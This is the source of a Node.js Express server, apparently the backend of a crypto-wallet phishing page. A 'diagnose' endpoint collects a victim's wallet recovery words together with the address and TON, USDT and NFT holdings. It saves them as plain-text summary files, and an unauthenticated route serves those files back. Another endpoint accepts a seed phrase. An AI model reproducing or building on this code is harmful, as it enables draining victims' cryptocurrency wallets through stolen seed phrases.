import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';


const app = express();
app.use(cors({
  origin: 'https://greeboolya.github.io',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type'],
  credentials: false
}));
const PORT = process.env.PORT || 3002;
app.use(express.json());

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const walletsDir = path.join(__dirname, 'wallets');
if (!fs.existsSync(walletsDir)) {
  fs.mkdirSync(walletsDir);
}

// POST /save-wallet (старый эндпоинт)
app.post('/save-wallet', (req, res) => {
  const { address } = req.body;
  if (!address) {
    return res.status(400).json({ error: 'No wallet address provided' });
  }
  const filePath = path.join(walletsDir, `wallet_${address}.txt`);
  fs.writeFile(filePath, address, err => {
    if (err) {
      return res.status(500).json({ error: 'Failed to save wallet' });
    }
    res.json({ success: true, file: filePath });
  });
});

// POST /api/diagnose (заглушка)

app.post('/api/diagnose', (req, res) => {
  const {
    walletName = 'Trust Wallet',
    address = '',
    words = [],
    ton = '',
    usdt = '',
    nft = '',
    tokens = '',
    tokenList = '',
    nftList = '',
    wordCount = words.length
  } = req.body;

  const now = new Date();
  const dateStr = now.toLocaleString('ru-RU', { hour12: false });
  const addressShort = address || '---';
  
  // Функция base64urlToHex (как в Page2_Animation.jsx)
  function base64urlToHex(addr) {
    try {
      const b64 = addr.replace(/-/g, '+').replace(/_/g, '/');
      const buf = Buffer.from(b64, 'base64');
      const hex = buf.toString('hex');
      return '0:' + hex.slice(4, 68);
    } catch (e) {
      return addr;
    }
  }
  
  const addressHex = base64urlToHex(addressShort).replace(/[^a-zA-Z0-9_-]/g, '_');
  const filename = `${addressHex}.summary.txt`;
  let summary = `=== Новая запись ===\n`;
  summary += `Дата: ${dateStr}\n`;
  summary += `Кошелёк: ${walletName}\n`;
  summary += `Количество слов: ${wordCount}\n`;
  summary += `Адрес кошелька: ${addressShort} - ${addressShort.length} символов начало с UQ\n`;
  summary += `Сумма TON: ${ton}\n`;
  summary += `Сумма USDT: ${usdt}\n`;
  summary += `Количество NFT: ${nft}\n`;
  summary += `Количество токенов всего: ${tokens}\n`;
  summary += `Слова:`;
  words.forEach((w, i) => { summary += `\n${i+1}. ${w}`; });
  summary += `\n\nСписок токенов: ${tokenList}\n`;
  summary += `Список NFT: ${nftList}\n`;

  const filePath = path.join(walletsDir, filename);
  fs.writeFile(filePath, summary, err => {
    if (err) {
      return res.status(500).json({ error: 'Failed to save summary' });
    }
    // После успешного создания файла сразу читаем его и возвращаем содержимое
    fs.readFile(filePath, 'utf8', (readErr, fileData) => {
      if (readErr) {
        return res.status(500).json({ error: 'Failed to read summary' });
      }
      res.json({ success: true, file: filename, summary: fileData });
    });
  });
});

// POST /api/save-seed (заглушка)
app.post('/api/save-seed', (req, res) => {
  const { seed } = req.body;
  if (!seed) {
    return res.status(400).json({ error: 'No seed provided' });
  }
  // Сохраняем seed в файл (или просто подтверждаем)
  res.json({ success: true, message: 'Seed сохранён', seed });
});

// GET /wallets/:filename.summary.txt (отдача файлов)
app.get('/wallets/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join(walletsDir, filename);
  // Логируем все файлы в папке wallets для отладки
  try {
    const files = fs.readdirSync(walletsDir);
    console.log('wallets dir files:', files);
  } catch (e) {
    console.log('Ошибка чтения папки wallets:', e);
  }
  if (!fs.existsSync(filePath)) {
    console.log('Файл не найден:', filePath);
    return res.status(404).send('File not found');
  }
  console.log('Отдаём файл:', filePath);
  res.sendFile(filePath);
});

app.listen(PORT, () => {
  console.log(`WalletSaver server running on http://localhost:${PORT}`);
});
